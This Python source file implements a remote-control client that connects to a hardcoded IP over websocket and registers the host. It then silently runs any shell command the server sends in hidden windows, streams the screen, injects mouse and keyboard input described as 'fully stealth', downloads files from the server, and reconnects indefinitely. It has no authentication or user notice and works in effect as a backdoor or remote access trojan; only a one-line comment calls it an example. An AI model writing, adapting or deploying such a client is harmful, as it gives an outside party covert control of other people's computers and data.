#!/usr/bin/env python3
import asyncio
import websockets
import json
import base64
import subprocess
import platform
import os
import time
from io import BytesIO
from datetime import datetime
from PIL import Image
import mss
import ctypes
import ctypes.wintypes as wintypes

# ── Win32 API refs ────────────────────────────────────────────────────────────
_user32 = ctypes.windll.user32
_SendInput = _user32.SendInput
_SetCursorPos = _user32.SetCursorPos
_GetForegroundWindow = _user32.GetForegroundWindow

# ── SendInput Constants ────────────────────────────────────────────────────────
INPUT_MOUSE = 0
INPUT_KEYBOARD = 1

# Mouse event flags
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
MOUSEEVENTF_ABSOLUTE = 0x8000

# Keyboard event flags
KEYEVENTF_KEYDOWN = 0x0000
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_UNICODE = 0x0004

WHEEL_DELTA = 120

# ── Virtual Key map (key name → VK code) ─────────────────────────────────────
_VK_MAP = {
    'enter': 0x0D, 'return': 0x0D, 'backspace': 0x08, 'tab': 0x09,
    'escape': 0x1B, 'esc': 0x1B, 'space': 0x20, 'delete': 0x2E,
    'up': 0x26, 'down': 0x28, 'left': 0x25, 'right': 0x27,
    'home': 0x24, 'end': 0x23, 'pageup': 0x21, 'pagedown': 0x22,
    'insert': 0x2D, 'capslock': 0x14, 'numlock': 0x90,
    'ctrl': 0x11, 'ctrlleft': 0xA2, 'ctrlright': 0xA3,
    'alt': 0x12,  'altleft': 0xA4, 'altright': 0xA5,
    'shift': 0x10, 'shiftleft': 0xA0, 'shiftright': 0xA1,
    'win': 0x5B, 'winleft': 0x5B, 'winright': 0x5C,
    'f1':  0x70, 'f2':  0x71, 'f3':  0x72, 'f4':  0x73,
    'f5':  0x74, 'f6':  0x75, 'f7':  0x76, 'f8':  0x77,
    'f9':  0x78, 'f10': 0x79, 'f11': 0x7A, 'f12': 0x7B,
    'printscreen': 0x2C, 'scrolllock': 0x91, 'pause': 0x13,
    'volumeup': 0xAF, 'volumedown': 0xAE, 'volumemute': 0xAD,
}

def _resolve_vk(key: str):
    """Return VK code for key name or single ASCII char."""
    k = key.lower().strip()
    if k in _VK_MAP:
        return _VK_MAP[k]
    if len(k) == 1:
        result = _user32.VkKeyScanW(ord(k))
        return result & 0xFF if result != -1 else None
    return None

# ── SendInput Structures ───────────────────────────────────────────────────────
class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ("dx", wintypes.LONG),
        ("dy", wintypes.LONG),
        ("mouseData", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_ulonglong),
    ]

class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_ulonglong),
    ]

class INPUT(ctypes.Union):
    _fields_ = [
        ("mi", MOUSEINPUT),
        ("ki", KEYBDINPUT),
    ]

class INPUTSTRUCT(ctypes.Structure):
    _fields_ = [
        ("type", wintypes.DWORD),
        ("u", INPUT),
    ]

def _get_screen_dimensions():
    """Get primary screen width and height in pixels."""
    try:
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            return monitor['width'], monitor['height']
    except Exception:
        # Fallback: use GetSystemMetrics
        SM_CXSCREEN = 0
        SM_CYSCREEN = 1
        width = _user32.GetSystemMetrics(SM_CXSCREEN)
        height = _user32.GetSystemMetrics(SM_CYSCREEN)
        return width, height

def _normalize_coords(x: int, y: int) -> tuple:
    """
    Convert pixel coordinates to normalized coordinates for SendInput.
    SendInput expects coordinates in range 0-65535 (virtual desktop coordinates).
    """
    screen_width, screen_height = _get_screen_dimensions()
    
    # Clamp to screen bounds
    x = max(0, min(x, screen_width - 1))
    y = max(0, min(y, screen_height - 1))
    
    # Normalize to 0-65535 range
    norm_x = int((x / screen_width) * 65535)
    norm_y = int((y / screen_height) * 65535)
    
    return norm_x, norm_y

def _send_input_mouse(action: str, x: int = 0, y: int = 0, data: int = 0):
    """Inject mouse event via SendInput API."""
    try:
        mi = MOUSEINPUT()
        
        # Normalize coordinates if absolute positioning is used
        if action == 'move':
            norm_x, norm_y = _normalize_coords(x, y)
            mi.dx = norm_x
            mi.dy = norm_y
            mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE
        else:
            mi.dx = x
            mi.dy = y
        
        mi.mouseData = data
        mi.time = 0
        mi.dwExtraInfo = 0
        
        if action == 'move':
            pass  # Already set above
        elif action == 'leftdown':
            mi.dwFlags = MOUSEEVENTF_LEFTDOWN
        elif action == 'leftup':
            mi.dwFlags = MOUSEEVENTF_LEFTUP
        elif action == 'rightdown':
            mi.dwFlags = MOUSEEVENTF_RIGHTDOWN
        elif action == 'rightup':
            mi.dwFlags = MOUSEEVENTF_RIGHTUP
        elif action == 'middledown':
            mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN
        elif action == 'middleup':
            mi.dwFlags = MOUSEEVENTF_MIDDLEUP
        elif action == 'wheel':
            mi.dwFlags = MOUSEEVENTF_WHEEL
            mi.mouseData = data  # Positive for up, negative for down
        else:
            return False
        
        inp = INPUTSTRUCT()
        inp.type = INPUT_MOUSE
        inp.u.mi = mi
        
        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
        return True
    except Exception as e:
        print(f"Error in _send_input_mouse: {e}")
        return False

def _send_input_keyboard(vk: int, is_down: bool):
    """Inject keyboard event via SendInput API."""
    try:
        ki = KEYBDINPUT()
        ki.wVk = vk
        ki.wScan = _user32.MapVirtualKeyW(vk, 0)  # MAPVK_VK_TO_VSC
        ki.dwFlags = KEYEVENTF_KEYDOWN if is_down else KEYEVENTF_KEYUP
        ki.time = 0
        ki.dwExtraInfo = 0
        
        inp = INPUTSTRUCT()
        inp.type = INPUT_KEYBOARD
        inp.u.ki = ki
        
        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
        return True
    except Exception as e:
        print(f"Error in _send_input_keyboard: {e}")
        return False

def _send_input_char(ch: str):
    """Inject Unicode character via SendInput API."""
    try:
        ki = KEYBDINPUT()
        ki.wVk = 0
        ki.wScan = ord(ch)
        ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYDOWN
        ki.time = 0
        ki.dwExtraInfo = 0
        
        inp = INPUTSTRUCT()
        inp.type = INPUT_KEYBOARD
        inp.u.ki = ki
        
        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
        
        # Release the key
        ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP
        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
        return True
    except Exception as e:
        print(f"Error in _send_input_char: {e}")
        return False

class RDPClient:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = platform.node()
        self.websocket = None
        self.running = False
        self.screenshot_active = False
        self.screenshot_interval = 0.2
        self.download_path = os.getcwd()
        self.command_queue = asyncio.Queue()
        self.file_response_queue = asyncio.Queue()
        self.file_chunks = {}  # Store chunks: {filename: {index: data}}
        self.active_commands = {}  # Track {pid: {command, start_time, process}}
        
        # Connection resilience
        self.connection_attempts = 0
        self.max_reconnect_delay = 60
        
    async def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)

                screen_w = screenshot.width
                screen_h = screenshot.height

                img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                img.thumbnail((1280, 720), Image.Resampling.LANCZOS)

                buffered = BytesIO()
                img.save(buffered, format="JPEG", quality=50, optimize=True)
                img_bytes = buffered.getvalue()
                img_str   = base64.b64encode(img_bytes).decode()

                return img_str, screen_w, screen_h, img_bytes
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return None, 0, 0, None
            
    def get_formatted_time(self):
        """Return formatted time as 'DayName:HH:MM:SS'"""
        now = datetime.now()
        day_name = now.strftime('%A')
        time_str = now.strftime('%H:%M:%S')
        return f"{day_name}:{time_str}"
    
    async def execute_command_isolated(self, command):
        """
        Execute command as isolated subprocess (like watchdog mechanism)
        - Spawn separate process
        - Track PID and logging
        - Wait for completion
        - Return status (success/fail) and output
        """
        timestamp = self.get_formatted_time()
        process = None
        
        try:
            print(f"[{timestamp}] [COMMAND] Launching: {command}")
            
            if platform.system() == 'Windows':
                # Windows: Use cmd.exe with CREATE_NEW_PROCESS_GROUP for isolation
                process = subprocess.Popen(
                    ['cmd.exe', '/c', command],
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True
                )
            else:
                # Linux: Use bash with new session for isolation
                process = subprocess.Popen(
                    ['/bin/bash', '-c', command],
                    start_new_session=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True
                )
            
            pid = process.pid
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [COMMAND] Process spawned (PID: {pid})")
            
            # Track active command
            self.active_commands[pid] = {
                'command': command,
                'start_time': time.time(),
                'process': process
            }
            
            # Wait for process to complete with timeout
            try:
                stdout, stderr = process.communicate(timeout=30)
                exit_code = process.returncode
                
                # Cleanup from tracking
                if pid in self.active_commands:
                    del self.active_commands[pid]
                
                timestamp = self.get_formatted_time()
                output = stdout if stdout else stderr
                
                if exit_code == 0:
                    print(f"[{timestamp}] [COMMAND] PID {pid} completed (exit code: 0)")
                    return {
                        'status': 'success',
                        'output': output,
                        'pid': pid,
                        'exit_code': exit_code,
                        'command': command
                    }
                else:
                    print(f"[{timestamp}] [COMMAND] PID {pid} failed (exit code: {exit_code})")
                    return {
                        'status': 'failed',
                        'output': output,
                        'pid': pid,
                        'exit_code': exit_code,
                        'command': command
                    }
                    
            except subprocess.TimeoutExpired:
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [COMMAND] PID {pid} timeout (30s) - killing...")
                
                # Kill process group on timeout
                if os.name == 'nt':
                    os.system(f'taskkill /PID {pid} /T /F')
                else:
                    import signal
                    os.killpg(os.getpgid(pid), signal.SIGKILL)
                
                process.kill()
                process.wait()
                
                # Cleanup
                if pid in self.active_commands:
                    del self.active_commands[pid]
                
                return {
                    'status': 'timeout',
                    'output': 'Command timeout (30s) - process terminated',
                    'pid': pid,
                    'exit_code': None,
                    'command': command
                }
                
        except Exception as e:
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [COMMAND] Error: {str(e)}")
            
            if process and pid in self.active_commands:
                del self.active_commands[pid]
            
            return {
                'status': 'error',
                'output': f"Error: {str(e)}",
                'pid': None,
                'exit_code': None,
                'command': command
            }
    
    async def execute_command(self, command):
        """Wrapper for command execution - handle special commands and delegation"""
        if command.startswith('/download '):
            filename = command.split(' ', 1)[1].strip()
            return await self.download_file(filename)
        
        # Run isolated command in separate thread to avoid blocking
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, lambda: asyncio.run(self.execute_command_isolated(command)))
        return result
    
    async def download_file(self, filename):
        try:
            # Request file metadata
            await self.websocket.send(json.dumps({
                'type': 'request_file',
                'filename': filename
            }))
            
            # Wait for metadata response
            metadata = await asyncio.wait_for(self.file_response_queue.get(), timeout=10)
            
            if not metadata.get('success'):
                error = metadata.get('error', 'Unknown error')
                return f"Download failed: {error}"
            
            total_chunks = metadata['total_chunks']
            file_size = metadata['file_size']
            
            print(f"Downloading {filename} ({file_size} bytes in {total_chunks} chunks)...")
            
            # Initialize chunks storage
            self.file_chunks[filename] = {}
            
            # Request all chunks
            for chunk_index in range(total_chunks):
                await self.websocket.send(json.dumps({
                    'type': 'get_chunk',
                    'filename': filename,
                    'chunk_index': chunk_index
                }))
                
                # Wait for chunk with timeout
                try:
                    chunk = await asyncio.wait_for(
                        self.file_response_queue.get(), 
                        timeout=30
                    )
                    
                    if chunk.get('success'):
                        chunk_data = base64.b64decode(chunk['data'])
                        self.file_chunks[filename][chunk_index] = chunk_data
                        print(f"Downloaded chunk {chunk_index + 1}/{total_chunks}")
                    else:
                        error = chunk.get('error', 'Unknown error')
                        return f"Chunk {chunk_index} download failed: {error}"
                        
                except asyncio.TimeoutError:
                    return f"Timeout waiting for chunk {chunk_index}"
            
            # Reconstruct file from chunks
            os.makedirs(self.download_path, exist_ok=True)
            filepath = os.path.join(self.download_path, filename)
            
            with open(filepath, 'wb') as f:
                for chunk_index in range(total_chunks):
                    if chunk_index in self.file_chunks[filename]:
                        f.write(self.file_chunks[filename][chunk_index])
            
            # Cleanup
            del self.file_chunks[filename]
            
            return f"File downloaded successfully: {filepath}"
            
        except asyncio.TimeoutError:
            return "Download timeout - request metadata from server failed"
        except Exception as e:
            return f"Download error: {str(e)}"
    
    def get_reconnect_delay(self):
        """Calculate exponential backoff delay"""
        delay = min(2 ** self.connection_attempts, self.max_reconnect_delay)
        jitter = delay * 0.1  # Add 10% jitter
        return delay + (jitter * (time.time() % 1))
            
    async def command_processor(self):
        while self.running:
            try:
                command = await self.command_queue.get()
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [PROCESSOR] Processing command: {command}")
                
                result = await self.execute_command(command)
                
                # Extract output from result dict or string
                if isinstance(result, dict):
                    output = result.get('output', '')
                    status = result.get('status', 'unknown')
                    pid = result.get('pid', None)
                    exit_code = result.get('exit_code', None)
                    
                    formatted_output = f"[CMD Output]\\nStatus: {status}\\nPID: {pid}\\nExit Code: {exit_code}\\n\\n{output}"
                    
                    timestamp = self.get_formatted_time()
                    print(f"[{timestamp}] [PROCESSOR] Command completed (Status: {status}, PID: {pid})")
                else:
                    formatted_output = result
                
                # Send result back to controller
                if self.websocket:
                    await self.websocket.send(json.dumps({
                        'type': 'command_output',
                        'command': command,
                        'output': formatted_output,
                        'timestamp': datetime.now().isoformat()
                    }))
                
                self.command_queue.task_done()
            except Exception as e:
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [PROCESSOR] Error: {str(e)}")
                await asyncio.sleep(0.1)
    
    async def send_screenshot_loop(self):
        """
        Adaptive real-time streaming:
        - 20 FPS saat layar aktif berubah
        - Turun ke 5 FPS saat idle (hemat bandwidth)
        - Skip frame jika konten identik
        """
        MIN_INTERVAL  = 1.0 / 20   # 50ms  → 20 FPS max
        IDLE_INTERVAL = 1.0 / 5    # 200ms → 5 FPS idle
        IDLE_AFTER    = 8          # frame tanpa perubahan sebelum masuk idle

        prev_bytes = None
        idle_count = 0

        while self.running:
            if not self.screenshot_active:
                await asyncio.sleep(0.1)
                continue

            t_start = asyncio.get_event_loop().time()
            try:
                screenshot, screen_w, screen_h, raw_bytes = await self.capture_screenshot()

                if screenshot and self.websocket:
                    changed = (prev_bytes is None) or (raw_bytes != prev_bytes)

                    if changed:
                        idle_count = 0
                        prev_bytes = raw_bytes
                        await self.websocket.send(json.dumps({
                            'type': 'screenshot',
                            'image': screenshot,
                            'screen_w': screen_w,
                            'screen_h': screen_h,
                            'timestamp': datetime.now().isoformat()
                        }))
                    else:
                        idle_count += 1

                elapsed  = asyncio.get_event_loop().time() - t_start
                interval = IDLE_INTERVAL if idle_count >= IDLE_AFTER else MIN_INTERVAL
                await asyncio.sleep(max(0.0, interval - elapsed))

            except Exception as e:
                print(f"Error in screenshot loop: {e}")
                await asyncio.sleep(1)
                
    async def handle_commands(self):
        try:
            async for message in self.websocket:
                data = json.loads(message)
                
                if data['type'] == 'start_screenshot':
                    self.screenshot_active = True
                    print("Screenshot streaming started")
                    
                elif data['type'] == 'stop_screenshot':
                    self.screenshot_active = False
                    print("Screenshot streaming stopped")
                    
                elif data['type'] == 'command':
                    command = data['command']
                    timestamp = self.get_formatted_time()
                    print(f"[{timestamp}] [HANDLER] Received command: {command}")
                    if command.strip().lower() == "/exit":
                        print(f"[{timestamp}] [HANDLER] Exit command received. Shutting down client...")
                        self.running = False
                        self.screenshot_active = False
                        await self.websocket.close()
                        os._exit(0)
                    await self.command_queue.put(command)
                    print(f"[{timestamp}] [HANDLER] Command queued for processing")
                    
                elif data['type'] == 'mouse_event':
                    await self.handle_mouse_event(data)

                elif data['type'] == 'keyboard_event':
                    await self.handle_keyboard_event(data)

                elif data['type'] == 'file_metadata' or data['type'] == 'file_chunk':
                    # Handle chunked file transfer
                    await self.file_response_queue.put(data)
                    
                elif data['type'] == 'file_data':
                    # Handle legacy file transfer (backward compatibility)
                    await self.file_response_queue.put(data)

        except websockets.exceptions.ConnectionClosed:
            print("Connection closed by server")
            self.running = False
            raise
            
    async def handle_mouse_event(self, data):
        """
        Inject mouse event via SendInput API — system-level injection.
        Fully stealth with absolute positioning.
        """
        try:
            action  = data.get('action')
            x       = int(data.get('x', 0))
            y       = int(data.get('y', 0))
            button  = data.get('button', 'left')

            if action == 'move':
                # Convert client coordinates to absolute screen coordinates (0-65535 range)
                _send_input_mouse('move', x, y)

            elif action == 'mousedown':
                if button == 'left':
                    _send_input_mouse('leftdown', x, y)
                elif button == 'right':
                    _send_input_mouse('rightdown', x, y)
                else:
                    _send_input_mouse('middledown', x, y)

            elif action == 'mouseup':
                if button == 'left':
                    _send_input_mouse('leftup', x, y)
                elif button == 'right':
                    _send_input_mouse('rightup', x, y)
                else:
                    _send_input_mouse('middleup', x, y)

            elif action == 'click':
                if button == 'left':
                    _send_input_mouse('leftdown', x, y)
                    _send_input_mouse('leftup', x, y)
                elif button == 'right':
                    _send_input_mouse('rightdown', x, y)
                    _send_input_mouse('rightup', x, y)
                else:
                    _send_input_mouse('middledown', x, y)
                    _send_input_mouse('middleup', x, y)

            elif action == 'double_click':
                for _ in range(2):
                    _send_input_mouse('leftdown', x, y)
                    _send_input_mouse('leftup', x, y)
                    time.sleep(0.05)  # Small delay between clicks

            elif action == 'scroll':
                direction = data.get('direction', 'up')
                clicks    = int(data.get('clicks', 3))
                delta     = WHEEL_DELTA * clicks * (1 if direction == 'up' else -1)
                _send_input_mouse('wheel', x, y, delta)

        except Exception as e:
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [MOUSE] Error: {e}")

    async def handle_keyboard_event(self, data):
        """
        Inject keyboard event via SendInput API — system-level injection.
        Works regardless of focus or foreground window.
        """
        try:
            action = data.get('action')
            key    = data.get('key', '')
            text   = data.get('text', '')

            if action == 'keydown':
                vk = _resolve_vk(key)
                if vk:
                    _send_input_keyboard(vk, is_down=True)

            elif action == 'keyup':
                vk = _resolve_vk(key)
                if vk:
                    _send_input_keyboard(vk, is_down=False)

            elif action == 'hotkey':
                # Urutan: semua modifier down → main key down → semua up
                keys = data.get('keys', [])
                if not keys:
                    return
                main_key = keys[-1]
                modifiers = keys[:-1]

                mod_vks = [_resolve_vk(m) for m in modifiers]
                mod_vks = [v for v in mod_vks if v]
                main_vk = _resolve_vk(main_key)

                # Send all modifier keys down
                for vk in mod_vks:
                    _send_input_keyboard(vk, is_down=True)
                    time.sleep(0.01)

                # Send main key down
                if main_vk:
                    _send_input_keyboard(main_vk, is_down=True)
                    time.sleep(0.01)
                    _send_input_keyboard(main_vk, is_down=False)
                    time.sleep(0.01)

                # Release all modifier keys
                for vk in reversed(mod_vks):
                    _send_input_keyboard(vk, is_down=False)
                    time.sleep(0.01)

            elif action == 'typewrite':
                # Send each character via Unicode input
                for ch in text:
                    _send_input_char(ch)
                    time.sleep(0.02)  # Small delay between characters

        except Exception as e:
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [KEYBOARD] Error: {e}")

    def _get_focused_hwnd(self):
        """
        Get the foreground window handle.
        Note: With SendInput, we don't need this anymore since SendInput works
        at system level without needing window focus.
        """
        return _GetForegroundWindow()

    async def connect(self):
        try:
            async with websockets.connect(self.server_url) as websocket:
                self.websocket = websocket
                self.running = True
                self.connection_attempts = 0  # Reset attempts on successful connection
                
                await websocket.send(json.dumps({
                    'type': 'register',
                    'client_id': self.client_id,
                    'hostname': platform.node(),
                    'os': platform.system()
                }))
                
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [CLIENT] Connected to server as {self.client_id}")
                
                await asyncio.gather(
                    self.send_screenshot_loop(),
                    self.handle_commands(),
                    self.command_processor()
                )
                
        except Exception as e:
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [CLIENT] Connection error: {e}")
            self.running = False
            
            # Cleanup active commands on disconnect
            if self.active_commands:
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [CLIENT] Cleaning up {len(self.active_commands)} active command(s)...")
                for pid, cmd_info in list(self.active_commands.items()):
                    try:
                        if os.name == 'nt':
                            os.system(f'taskkill /PID {pid} /T /F')
                        else:
                            import signal
                            os.killpg(os.getpgid(pid), signal.SIGKILL)
                    except:
                        pass
                self.active_commands.clear()
            
    async def start(self):
        while True:
            try:
                await self.connect()
            except Exception as e:
                print(f"[DISCONNECT] ✗ Connection closed by server: {e}")
                self.connection_attempts += 1
            
            reconnect_delay = self.get_reconnect_delay()
            print(f"[RECONNECT] Attempt {self.connection_attempts} - Retrying in {reconnect_delay:.2f} seconds...")
            await asyncio.sleep(reconnect_delay)

if __name__ == '__main__':
    """THIS JUST EXMPLE"""
    SERVER_URL = "ws://108.137.15.61:3500"
    
    client = RDPClient(SERVER_URL)
    asyncio.run(client.start())
